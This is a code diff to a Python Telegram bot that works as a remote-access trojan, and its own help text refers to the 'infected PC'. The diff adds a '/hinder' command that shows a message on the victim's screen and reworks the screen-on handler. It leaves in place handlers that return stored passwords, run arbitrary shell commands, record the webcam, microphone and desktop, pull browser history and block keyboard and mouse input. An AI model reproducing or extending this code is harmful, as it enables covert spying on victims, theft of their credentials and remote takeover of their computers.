@@ -31,6 +31,7 @@ async def send_message(bot, id, text):
 
 @dp.message_handler(commands=['start', 'help'])
 async def command_start(message=types.Message):
+    button_help = KeyboardButton('/help')
     button_screenshot = KeyboardButton('Скриншот')
     button_webcam = KeyboardButton('Фото с веб-камеры')
     button_music = KeyboardButton('Музыка')
@@ -44,9 +45,10 @@ async def command_start(message=types.Message):
 
     commands_kb = ReplyKeyboardMarkup(resize_keyboard=True).add(
         button_screenshot, button_webcam, button_music, button_wifi, button_meme,
-        button_lmb, button_block, button_unblock, button_turnoffscreen, button_turnonscreen)
+        button_lmb, button_block, button_unblock, button_turnoffscreen, button_turnonscreen, button_help)
 
     await bot.send_message(message.from_user.id,
+                           '/help - список команд'
                            '/download "имя файла" - скачать файл из директории, в которовый вы находитесь.\n'
                            '/openurl "ссылка" - открыть ссылку\n'
                            '/v "число от 0 до 100" - устанвоить громкость ПК\n'
@@ -56,7 +58,8 @@ async def command_start(message=types.Message):
                            '/audmic "время в секундах" - запись звука с микрофона на протяжении указанного времени\n'
                            '/webvid "время в секундах" - запись видео с веб-камеры на протяжении указанного времени\n'
                            '/deskvid "время в секундах" - запись видео с рабочего стола на протяжении указанного времени\n'
-                           '/history "дата в формате 01-01-2022" - история с веб-браузеров в указанную дату\n'
+                           '/history "дата в формате "ГГГГ-ММ-ДД" - история с веб-браузеров в указанную дату\n'
+                           '/hinder ,"время в секундах","сообщение" - на зараженном ПК в течение указанного времени будет воспроизводиться указанный текст\n'
                            '\n'
                            '~ Скриншот - получить скриншот.\n'
                            '~ Фото с веб-камеры - получить изображение вебкамеры.\n'
@@ -67,7 +70,7 @@ async def command_start(message=types.Message):
                            '~ Блок ввода - запрещает юзеру ПК пользоваться устройствами ввода\n'
                            '~ Анблок ввода - отменяет команду "Блок ввода"\n'
                            '~ Выключить экран - Выключить экран\n'
-                           '~ Включить экран - Включить экран (странно работает(не работает))'
+                           '~ Включить экран - Включить экран\n'
                            ,
                            reply_markup=commands_kb)
 
@@ -190,7 +193,7 @@ async def turnoff_screen(message: types.Message):
 
 @dp.message_handler(text='Включить экран')
 async def turnon_screen(message: types.Message):
-    pyautogui.click()
+    rm.turn_on_screen()
 
 
 @dp.message_handler(commands='v')
@@ -229,13 +232,21 @@ async def get_passwords(msg: types.Message):
     await send_message(bot, msg.from_user.id, rm.get_passwords())
 
 
+@dp.message_handler(commands=["hinder"])
+async def get_keyboard_history(message: types.Message):
+    msg = message.text.split(",")
+    duration = int(msg[1])
+    text_of_message = str(msg[2])
+    rm.check_keyboard_inputes(duration, text_of_message)
+
+
 @dp.message_handler()
-async def echo_message(msg: types.Message):
-    print(msg.text)
-    command = str(msg.text).split()
+async def echo_message(message: types.Message):
+    print(message.text)
+    command = str(message.text).split()
     result = rm.execute(command)
 
-    await send_message(bot, msg.from_user.id, result)
+    await send_message(bot, message.from_user.id, result)
 
 
 @dp.message_handler(content_types=[ContentType.DOCUMENT, ContentType.UNKNOWN])
